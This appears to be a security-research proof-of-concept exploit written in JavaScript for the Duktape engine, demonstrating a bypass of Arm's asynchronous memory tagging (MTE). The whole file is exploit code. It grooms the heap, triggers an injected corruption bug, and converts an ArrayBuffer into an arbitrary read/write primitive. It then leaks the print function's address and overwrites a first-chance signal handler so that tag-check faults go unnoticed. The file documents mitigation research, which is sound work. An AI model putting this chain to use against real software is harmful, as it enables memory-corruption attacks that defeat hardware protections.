// Copyright 2023 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

function fill(buffer, value) {
  var tmp = new Uint8Array(buffer);
  for (var i = 0; i < tmp.byteLength; ++i) {
    tmp[i] = value;
  }
}

var keep_buffers = new Array(128);
var keep_arrays = new Array(128);
for (var i = 0; i < 128; ++i) {
  keep_buffers[i] = 2.9043552100789517e-144;
  keep_arrays[i] = 2.9043552100789517e-144;
}

for (var i = 0; i < 0x80; ++i) {
  var next_buffer = new ArrayBuffer(0x40);
  fill(next_buffer, i);

  var next_array = new Array(5);
  next_array[0] = 2.9043552100789517e-144;
  next_array[1] = next_array;
  next_array[2] = next_buffer;
  next_array[3] = print;
  next_array[4] = 2.008776679223492e-139;

  keep_arrays[i] = (next_array);
  keep_buffers[i] = (next_buffer);
}

var buffer = new ArrayBuffer(0x20);
fill(buffer, 0x21);

for (var i = 0x80; i < 0x90; ++i) {
  var next_buffer = new ArrayBuffer(0x40);
  fill(next_buffer, i);

  var next_array = new Array(5);
  next_array[0] = 2.9043552100789517e-144;
  next_array[1] = next_array;
  next_array[2] = next_buffer;
  next_array[3] = print;
  next_array[4] = 2.008776679223492e-139;

  keep_arrays[i] = next_array;
  keep_buffers[i] = next_buffer;
}

// XXX: This is where we trigger the bug, intentionally after almost all of the
// memory allocations are complete, ensuring that we are less likely to trigger
// mmap calls later in the exploit when these would cause a SIGSEGV
var before = performance.now();
print('access');
tag_check_fail();
corrupt_bytearray(buffer);
var data_view = new DataView(buffer);

// first check that layout is as we expect -> ArrayBuffer is directly after the
// buffer allocation
if (data_view.getUint32(0x7c) != 0xffffffff) {
  print('heap layout not as expected!');
}

// Now we've located the base of our oob-read-write buffer
var buffer_ptr_lo = data_view.getUint32(0x68, true) + 0x20;
var buffer_ptr_hi = data_view.getUint32(0x6c, true);

var next_buffer_ptr_lo = 0;
var next_buffer_ptr_hi = 0;
var print_f_ptr_lo = 0;
var print_f_ptr_hi = 0;

for (var i = 0; i < 0x400; i += 4) {
  if (data_view.getUint32(i) == 0x22222222
      && data_view.getUint32(i + 4) == 0x22222222
      && data_view.getUint32(i + 64) == 0x23232323
      && data_view.getUint32(i + 68) == 0x23232323) {
    next_buffer_ptr_lo = data_view.getUint32(i + 32, true);
    next_buffer_ptr_hi = data_view.getUint32(i + 36, true);
    print_f_ptr_lo = data_view.getUint32(i + 48, true);
    print_f_ptr_hi = data_view.getUint32(i + 52, true);
    break;
  }
}

var next_buffer_offset = next_buffer_ptr_lo - buffer_ptr_lo;

data_view.setUint32(next_buffer_offset + 0x4c, 0x1000, true);
var next_buffer_data_ptr_lo = data_view.getUint32(next_buffer_offset + 0x38, true);
var next_buffer_data_ptr_hi = data_view.getUint32(next_buffer_offset + 0x3c, true);
var next_buffer_data_offset = next_buffer_data_ptr_lo - buffer_ptr_lo;

var buffer_i = data_view.getUint8(next_buffer_data_offset + 0x20);
var next_buffer = keep_buffers[buffer_i];
if (next_buffer.byteLength != 0x1000) {
  print('heap layout not as expected 2!');
}

// We convert the existing buffer from a fixed buffer to a dynamic external
// buffer

// DUK_HBUFFER_FLAG_DYNAMIC | DUK_HBUFFER_FLAG_EXTERNAL | DUK_HTYPE_BUFFER
data_view.setUint32(next_buffer_data_offset, 0x00000182, true);
data_view.setUint32(next_buffer_data_offset + 0x18, 0x1000, true);
var rw_data_view = new DataView(next_buffer);

// Now we leak a pointer to the executable (we take the pointer from the native
// print function).

data_view.setUint32(next_buffer_data_offset + 0x20, print_f_ptr_lo, true);
data_view.setUint32(next_buffer_data_offset + 0x24, print_f_ptr_hi, true);

var print_ptr_lo = rw_data_view.getUint32(0x38, true);
var print_ptr_hi = rw_data_view.getUint32(0x3c, true);

data_view.setUint32(next_buffer_data_offset + 0x20, print_ptr_lo, true);
data_view.setUint32(next_buffer_data_offset + 0x24, print_ptr_hi, true);

// Find the return instruction at the end of print, we'll use that as our
// first chance signal handler to just return the signal number
for (var return_offset = 0; return_offset < 0x80; return_offset += 4) {
  if (rw_data_view.getUint32(return_offset, true) == 0xd65f03c0) {
    break;
  }
}

var return_ptr_lo = print_ptr_lo + return_offset;
var return_ptr_hi = print_ptr_hi;

var base_ptr_lo = print_ptr_lo - print_offset;
var base_ptr_hi = print_ptr_hi;

var first_chance_handler_ptr_lo = base_ptr_lo + first_chance_handler_offset;
var first_chance_handler_ptr_hi = base_ptr_hi;

data_view.setUint32(next_buffer_data_offset + 0x20, first_chance_handler_ptr_lo, true);
data_view.setUint32(next_buffer_data_offset + 0x24, first_chance_handler_ptr_hi, true);

rw_data_view.setUint32(0, return_ptr_lo, true);
rw_data_view.setUint32(0x4, return_ptr_hi, true);

// If memory tagging is working, this should trigger a SIGSEGV and kill the
// process
var after = performance.now();
print("Async MTE has been bypassed [" + (after - before).toString() + "ms]");